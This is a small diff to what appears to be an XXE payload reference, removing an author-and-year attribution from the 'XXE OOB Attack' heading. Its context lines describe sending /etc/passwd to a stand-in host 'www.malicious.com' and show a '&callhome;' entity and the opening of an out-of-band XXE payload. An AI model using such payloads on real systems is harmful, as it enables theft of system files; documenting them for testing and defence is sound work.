@@ -263,7 +263,7 @@ Send the content of `/etc/passwd` to "www.malicious.com", you may receive only t
 <foo>&callhome;</foo>
 ```
 
-### XXE OOB Attack (Yunusov, 2013)
+### XXE OOB Attack
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
